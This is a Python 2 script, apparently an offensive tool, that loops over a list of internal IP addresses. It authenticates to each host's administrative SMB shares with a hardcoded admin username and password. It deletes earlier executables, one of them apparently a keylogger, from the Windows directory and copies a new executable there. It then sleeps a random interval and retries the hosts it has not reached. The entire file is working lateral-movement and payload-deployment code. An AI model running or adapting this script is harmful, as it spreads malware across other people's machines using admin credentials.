#!C:\Python27\python.exe
import os
import os.path
import subprocess
import shutil
import random
import time


#targetList = ["10.10.30.10"]
targetList = ["10.10.30.10", "127.0.0.1", "10.10.10.10", "10.10.10.20",]
cutList = []
# print targetList

def netUse(ip_addr):
    conn = subprocess.call("net use \\\\" + ip_addr + "\\IPC$ /USER:echonetadmin M1ch@elA")
    # winCMD = 'NET USE ' + networkPath + ' /User:' + user + ' ' + password
    # subprocess.Popen(winCMD, stdout=subprocess.PIPE, shell=True)
    return conn

def checkFile(ip_addr):
    check = os.path.exists("\\\\" + ip_addr + "\\C$\\Windows\\writekl.exe")
    return check

def checkFile2(ip_addr):
    check = os.path.exists("\\\\" + ip_addr + "\\C$\\Windows\\testupload1.exe")
    return check
# Need to replace file path with start up path
def checkFile3(ip_addr):
    check = os.path.exists("\\\\" + ip_addr + "\\C$\\Windows\\testupload1.lnk")
    return check

def copyFiles(ip_addr):
    # copy = subprocess.call("copy testupload1.exe \\\\" + ip_addr + "\\C$\\Windows\\")
    exe = shutil.copy2("testupload1.exe", "\\\\" + ip_addr + "\\C$\\Windows\\")
    checkexe = os.path.exists("\\\\" + ip_addr + "\\C$\\Windows\\testupload1.exe")
    if checkexe != True:
        print "Executable file failed to copy!"

    ## Repeat above with start up path and link file

def snekbite():
    for target in targetList:
        try:
            ping = os.system("ping -n 1 " + target + " > nul")
        except Exception as e:
            print "Error: " + e
        else:
            if ping == 0:
                print "Successful ping to " + target
                if netUse(target) == 0:
                    if checkFile(target) != 0:
                        print "Removing writekl.exe file!"
                        os.remove("\\\\" + target + "\\C$\\Windows\\writekl.exe")
                    if checkFile2(target) != 0:
                        print "Removing TiWork.exe file!"
                        os.remove("\\\\" + target + "\\C$\\Windows\\testupload1.exe")
                    # Need to replace file path with start up file path
                    #if checkFile3(target) != 0:
                    #    os.remove("\\\\" + ip_addr + "\\C$\\")
                    
                    print "Copying Files!"
                    copyFiles(target)
                    print "File copy complete!"
                    cutList.append(target)
                else:
                    print "NET USE failed, removing target from list!"
                    cutList.append(target)
            else:
                print "Ping Failed to " + target + ". Target will be removed from target list!"
                cutList.append(target)
                #continue
                #targetList.remove(target)



with open('snake.txt', 'r') as snek:
    print(snek.read())

snekbite()

# print cutList
for item in cutList:
    targetList.remove(item)

if targetList:
    wait = random.randint(1, 30)
    print "Sleeping for " + str(wait) + " min."
    print "Will continue with:"
    print targetList
    time.sleep(wait * 60)
    snekbite()
else:
    print "Exiting. Target list empty!"